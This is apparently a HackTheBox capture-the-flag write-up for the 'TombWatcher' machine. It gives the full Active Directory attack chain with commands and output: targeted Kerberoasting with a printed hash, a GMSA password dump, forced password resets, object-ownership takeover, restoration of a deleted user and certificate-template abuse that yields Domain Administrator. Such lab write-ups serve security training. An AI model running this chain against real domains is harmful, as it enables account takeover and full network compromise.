---
title: TombWatcher
categories: [HackTheBox]
tags: [nmap, targetedkerberoasting, gmsa, adcs, certipy, bloodyad, evil-winrm, tombstone]
media_subpath: /images/hackthebox_tombwatcher/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/59c74a969b4fec16cd8072d253ca9917.png'
---

## Summary
**TombWatcher** is a Medium-rated HackTheBox machine that demonstrates a sophisticated Active Directory attack chain involving multiple privilege escalation techniques and certificate-based authentication abuse. The attack begins with initial credentials for a low-privileged user, followed by targeted Kerberoasting to compromise another user account. Through careful analysis of Active Directory permissions, we discover and exploit Group Managed Service Account (GMSA) vulnerabilities to gain access to service accounts. After manipulating object ownership and permissions, we restore deleted user accounts and exploit Active Directory Certificate Services (ADCS) to obtain administrator certificates, ultimately achieving complete domain compromise through certificate-based authentication.

## Initial Access

### Provided Credentials
As is common in real-life Windows penetration tests, we start with credentials for the following account:
- **Username**: `henry`
- **Password**: `H3nry_987TGV!`

> This represents a realistic scenario where initial access is gained through social engineering, password reuse, or other initial compromise vectors.
{: .prompt-info}

## Nmap Scan

We start our enumeration of the given IP Address by running an `nmap` scan

```shell
nmap -sVC -Pn -oN nmap -vv $IP
```
> Command breakdown:
- `nmap` : This command is used to run the nmap tool.
- `-sVC` : This flag is the combination of the `-sV` and `-sC` flags, which specifies that we want to run a service version scan and a script scan, respectively.
- `-Pn` : Treat all hosts as online
- `-oN` : Output to a file in normal nmap format
- `-vv` : Very verbose output
{: .prompt-info}

```bash
➜  Tombwatcher cat nmap | grep open       
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-08-07 20:47:36Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Principal Ports Analysis

The Nmap scan reveals several key indicators that this machine is an **Active Directory Domain Controller**:

#### Core Active Directory Services

| Port | Service | Purpose | AD DC Indicator |
|------|---------|---------|-----------------|
| **53/tcp** | DNS | Domain Name System | ✅ **Critical** - AD DCs always run DNS for domain resolution |
| **88/tcp** | Kerberos | Authentication protocol | ✅ **Critical** - Kerberos Key Distribution Center (KDC) for authentication |
| **389/tcp** | LDAP | Lightweight Directory Access Protocol | ✅ **Critical** - Directory services for user/group queries |
| **636/tcp** | LDAPS | LDAP over SSL/TLS | ✅ **Critical** - Secure LDAP communication |
| **3268/tcp** | Global Catalog | LDAP for forest-wide queries | ✅ **Critical** - Global Catalog service for multi-domain forests |
| **3269/tcp** | Global Catalog SSL | Secure Global Catalog | ✅ **Critical** - Secure Global Catalog communication |

#### Supporting Windows Services

| Port | Service | Purpose | AD DC Indicator |
|------|---------|---------|-----------------|
| **135/tcp** | MSRPC | Microsoft Remote Procedure Call | ✅ **Common** - Windows service communication |
| **139/tcp** | NetBIOS-SSN | NetBIOS Session Service | ✅ **Common** - Legacy Windows networking |
| **445/tcp** | SMB | Server Message Block | ✅ **Common** - File sharing and authentication |
| **464/tcp** | Kerberos Password | Kerberos password change | ✅ **Critical** - Kerberos password change protocol |
| **593/tcp** | RPC over HTTP | RPC communication over HTTP | ✅ **Common** - Remote procedure calls |

#### Management and Web Services

| Port | Service | Purpose | AD DC Indicator |
|------|---------|---------|-----------------|
| **80/tcp** | HTTP | Web server (IIS) | ⚠️ **Optional** - May host AD management tools or web apps |
| **5985/tcp** | WinRM | Windows Remote Management | ✅ **Common** - PowerShell remoting and management |

### Domain Controller Identification

**Definitive AD DC Indicators:**
1. **Port 88 (Kerberos)** - Only domain controllers run the Kerberos KDC service
2. **Port 389/636 (LDAP/LDAPS)** - Directory services are exclusive to domain controllers
3. **Port 3268/3269 (Global Catalog)** - Global Catalog services are only on domain controllers
4. **Port 464 (Kerberos Password)** - Kerberos password change service is DC-specific
5. **Domain Information** - The scan shows `Domain: tombwatcher.htb` confirming this is a domain controller

**Supporting Evidence:**
- **DNS on port 53** - AD DCs typically host DNS for the domain
- **Multiple LDAP ports** - Standard LDAP (389), Secure LDAP (636), Global Catalog (3268/3269)
- **Kerberos services** - Both authentication (88) and password change (464) protocols
- **Windows services** - Standard Windows networking services (135, 139, 445, 593)

> **Key Insight**: The presence of ports 88, 389, 636, 3268, 3269, and 464 together is a definitive indicator of an Active Directory Domain Controller. These services are exclusive to domain controllers and cannot be found on regular Windows workstations or member servers.
{: .prompt-warning}

## Active Directory Enumeration

### Access Control List (ACL) Analysis

Henry has `WriteProperty` permissions over the `alfred` user account, which allows us to perform targeted Kerberoasting attacks against Alfred's service accounts.

#### BloodHound Analysis

Using BloodHound, we can visualize the permission relationships:

![BloodHound ACL Analysis](file-20250807164511518.png)

#### BloodyAD Enumeration

We can use `bloodyAD` to enumerate writable objects and analyze specific ACLs:

```bash
echo "Running as: $USERAD"; bloodyAD -d $DOMAIN --host $IP -u $USERAD -p $PASS get writable
echo "Running as: $USERAD"; bloodyAD -d $DOMAIN --host $IP -u $USERAD -p $PASS get object "CN=Alfred,CN=Users,DC=tombwatcher,DC=htb" --resolve-sd
```

> Command breakdown:
- `bloodyAD` : Python tool for Active Directory manipulation
- `-d $DOMAIN` : Specify the domain name
- `--host $IP` : Target domain controller IP
- `-u $USERAD -p $PASS` : Authentication credentials
- `get writable` : Enumerate objects we can write to
- `get object` : Get specific object details with ACL resolution
{: .prompt-info}

The results show:

![BloodyAD Writable Objects](file-20250807164535161.png)

![BloodyAD ACL Details](file-20250807164617493.png)

## Targeted Kerberoasting

### Exploiting Alfred's Service Accounts

Since Henry has `WriteProperty` permissions over Alfred, we can perform targeted Kerberoasting to compromise Alfred's credentials:

```bash
targetedKerberoast.py -d $DOMAIN -u $USERAD -p $PASS
```

The attack successfully retrieves Alfred's Kerberos ticket:

```
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$d4b567399159a304d25d823544a1b240$7b63eb1a110bd65276ed8f827ac49e275dbdc3c4cfa8759a507caa9e88e03a44c37af1988bff7f0184a39826461844ad47cc3a8a240d85807410782981d7bad4cdbc9f78b1bea1cd94a8098cc63f714f4fabf872768e243ac4170d6780963442d7b3f3a989bf578e14474694bb0796478a3c76dbd98039c7b4147bec6faa425d13370efab04674e216c30aca8a87bc1b168ab4aeb95843f6abec3008dd4e7f91c191ba6ff6bc5b458c2e747789b698a32b454df58445814f06f57aac4028c13381bfdea50e51104667dd11e31e6b920b918b58945f4d376a8503e275f7e41934bfa3b4c6ffd8ae4cfb68fb5dc7af94b9a2d6286952faa168883f63004e94504d1553d00690419f45ccc88fe09f3ca90be566f4e6e00e989f1b35e26124ac4781357a11631ee088d27c4e8174d3864181959fc1fa4b932829b5f0aacbde11b522ac5aef2e9f35571ad6373774bef9f9e02c31cfd2250c47c68c2f6479d362498811a25a9089c9540dc98fc2bcabbf469b2437df91eb35c582ddad667caff83212d0c5a69640bc49bc5e0656a9338c2d2c1b76ba6c2aae7f82563a04a070c1eaeded4d159b6f3127a60cd2425f6fdd2ef8993feba3a3aa76fe3a8fd4c7d6ba50e4933eac638ea33c1a1560a758b182f1e95fe2056376a2593fd1e25192ad09cc9a8cdfbca44f4a7c841d0644d672ffc0eb14865f205a5e467017797d265def604bca66071537f256447725814a5503656907406a1231fd8f6508a6e062c46c46c857ec80035c3131f3a8da29a3798656a2a1385062ed2d633207731d53eeb486252d3714c6b2b645ee5587a9dce0443484622a4f653730c84a6b881d8ae9bfeddae814ac8a5d79d6cbb7261d39b339ba0086fd00604295b45abb00b760a5a6a267731109c68fe36445df841754eb8e8c345bb01905b6173534654dac54c51320cea1e25bca23cd3a530e6d7e3ab290f4dd18bed755f84e6552c725c0f374ab95fecc13cc131c65531409db8c1ccc8ed6e00be3f77fb8031015a5d26c2c6b816312fd3f5d4e1fa41f23e008bca4f95d88b83f36ecf8eef592cd407175e98f89faa7aed7a908750c746da82e35eb63366df5b3db69742400b855de86ca66cc6ca8dbdc441934ad26ee2f285a618e81e1346af36e129e9a91ac9d02a71a1a766555c8314eae05ac53dc9b17ce386f7205365fa55397a934ff92e36dd73d44ec6ed676a64a55109361772050a5e57e0c32c3e57bc91b1984fe04d075884fb7cc43b712fc76ac89a833766062921d946e821737ea327a3549295c480e5a3a1a024c2d59ece035afec732210dcc27955b16d4b4ab9154277ce8e712e402971958cb35023f8eca1d7f4817bc47132270383f50a0f4428b4c23995adc3da25e95198781ba2872941bfec5fcdb71905bd500f02de693fa44fbb3c530a5a6a963ab9680e71974468931fe536eb9d36a5d444e31d4555caf81d2275
```

### Password Cracking

We can crack Alfred's password using `hashcat`:

![Hashcat Cracking](file-20250807165008632.png)

The cracked password is: `basketball`

## Group Managed Service Account (GMSA) Exploitation

### Infrastructure Group Membership

Alfred has `AddSelf` permissions on the `INFRASTRUCTURE` group, which allows us to add ourselves to this group:

![BloodHound Infrastructure Group](file-20250807165128112.png)

#### Adding to Infrastructure Group

```bash
bloodyAD -d $DOMAIN --host $IP -u $USERAD -p $PASS add groupMember "INFRASTRUCTURE" $USERAD
```

Result:
```
[+] alfred added to INFRASTRUCTURE
```

### GMSA Password Retrieval

The `INFRASTRUCTURE` group has read permissions on the GMSA password for `ANSIBLE_DEV$`:

![BloodHound GMSA Permissions](file-20250807165217524.png)

#### Enumerating GMSA Passwords

We can retrieve the GMSA password using `nxc`:

```bash
nxc ldap $FQDN -u $USERAD -p $PASS --gmsa
```

Output:
```
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\alfred:basketball
LDAP        10.10.11.72     389    DC01             [*] Getting GMSA Passwords
LDAP        10.10.11.72     389    DC01             Account: ansible_dev$         NTLM: 7bc5a56af89da4d3c03bc048055350f2     PrincipalsAllowedToReadPassword: Infrastructure
```

#### Alternative GMSA Enumeration

We can also use `gMSADumper.py` for more detailed GMSA information:

```bash
gMSADumper.py -u $USERAD -p $PASS -d $DOMAIN
```

Output:
```
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7bc5a56af89da4d3c03bc048055350f2
ansible_dev$:aes256-cts-hmac-sha1-96:29a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
ansible_dev$:aes128-cts-hmac-sha1-96:de6c86d8b6a71c4538f82dc570f7f9a6
```

> **GMSA Exploitation**: Group Managed Service Accounts (GMSAs) are special service accounts that automatically manage their passwords. The `INFRASTRUCTURE` group has permission to read the GMSA password, which we can use to authenticate as the `ansible_dev$` service account.
{: .prompt-warning}

## Password Reset Attack

### Force Change Password Permissions

The `ansible_dev$` service account has `ForceChangePassword` permissions over the `SAM` user:

![BloodHound Force Change Password](file-20250807165823692.png)

#### Changing SAM's Password

We can use the GMSA credentials to change SAM's password:

```bash
net rpc password "sam" 'P@$$word123!' -U 'ansible_dev$' -S $IP --password=7bc5a56af89da4d3c03bc048055350f2 --pw-nt-hash
```

Verifying the password change:

```bash
nxc ldap $FQDN -u sam -p 'P@$$word123!'
```

Result:
```
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\sam:P@$$word123!
```

## Object Ownership Manipulation

### WriteOwner Permissions

SAM has `WriteOwner` permissions over the `john` user account:

![Bh Enum](file-20250807170025506.png)
#### Taking Ownership

We can grant ourselves ownership rights and then grant `GenericAll` permissions:

```bash
bloodyAD --host $FQDN -u $USERAD -p $PASS set owner john sam
```

Result:
```
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

#### Granting GenericAll Permissions

```bash
bloodyAD --host $FQDN -u $USERAD -p $PASS add genericAll john sam
```

Result:
```
[+] sam has now GenericAll on john
```

#### Changing John's Password

```bash
bloodyAD --host $FQDN -u $USERAD -p $PASS set password john 'P@$$word123!'
```

Result:
```
[+] Password changed successfully!
```

### Accessing John's Account

We can now access John's account using `evil-winrm`:

![Evil-WinRM Access](file-20250807170609445.png)

![John's Desktop](file-20250807170825080.png)

## Active Directory Certificate Services (ADCS) Exploitation

### GenericAll Permissions on ADCS OU

John has `GenericAll` permissions over the ADCS Organizational Unit:

![BloodHound ADCS Permissions](file-20250807170522679.png)

### Certificate Template Analysis

Using `certipy`, we can enumerate certificate templates:

```bash
certipy find -target $FQDN -k -no-pass -enabled -hide-admins -oids -stdout
```

![Certipy Template Analysis](file-20250807171027114.png)

The output shows that a user with enrollment rights over the `webserver` template was deleted (indicated by the SID showing instead of the username).

### Deleted Object Recovery

#### Finding the Deleted User

We can search for the deleted object using the SID:

```powershell
get-adobject -IncludeDeletedObjects -Filter {objectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -properties objectSid
```

Result:
```
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

#### Restoring the Deleted User

Since John has `GenericAll` permissions on the ADCS OU, we can restore the deleted `cert_admin` user and change its password because it belongs to the `ADCS OU`:

```bash
*Evil-WinRM* PS C:\Users\john\Documents> get-adobject -properties objectsid -includedeletedobjects -filter {objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"}


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectsid         : S-1-5-21-1392491010-1358638721-2126982587-1111



*Evil-WinRM* PS C:\Users\john\Documents> 

*Evil-WinRM* PS C:\Users\john\Documents> get-aduser cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :

*Evil-WinRM* PS C:\Users\john\Documents> $pass = (convertto-securestring -string 'P@$$word123!' -AsPlainText -Force)
*Evil-WinRM* PS C:\Users\john\Documents> set-adaccountpassword -identity cert_admin -newpassword $pass -Reset
```

If we rerun certipy we will find that it is vulnerable to `ESC15` with our new restored user

```bash
certipy find -target $FQDN -u cert_admin -p 'P@$$word123!' -enabled -hide-admins -oids -stdout -vulnerable
```

![Certipy Vulnerable Templates](file-20250807172505366.png)

### Certificate Request on Behalf of Administrator

#### Requesting Administrator Certificate

We can use the `cert_admin` account to request a certificate on behalf of the Administrator:

```bash
certipy req \
    -u cert_admin -p 'P@$$word123!' \
    -dc-ip $IP -target $FQDN \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'
```

Result:
```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

## Domain Compromise

### Certificate-Based Authentication

We can now use the Administrator certificate to authenticate and obtain a TGT:

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

Result:
```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
```

### Final Access

With the Administrator certificate, we have achieved complete domain compromise and can access any resource in the domain.

## Conclusion

### Quick Recap
- The machine was compromised through targeted Kerberoasting of Alfred's service accounts
- We exploited GMSA permissions to gain access to the `ansible_dev$` service account
- Object ownership manipulation allowed us to take control of the `john` user account
- ADCS exploitation through deleted user restoration enabled certificate-based authentication
- We obtained an Administrator certificate and achieved complete domain compromise

### Lessons Learned
- **Targeted Kerberoasting**: WriteProperty permissions can be exploited for targeted attacks
- **GMSA Security**: Group Managed Service Accounts can be dangerous if permissions are misconfigured
- **Object Ownership**: WriteOwner permissions can lead to complete object control
- **ADCS Vulnerabilities**: Deleted user accounts can be restored and exploited for certificate abuse
- **Certificate-Based Authentication**: ADCS can be exploited to obtain high-privilege certificates
- **Defense in Depth**: Multiple security controls should be in place to prevent privilege escalation
- **Active Directory Security**: Proper ACL management is crucial for preventing lateral movement
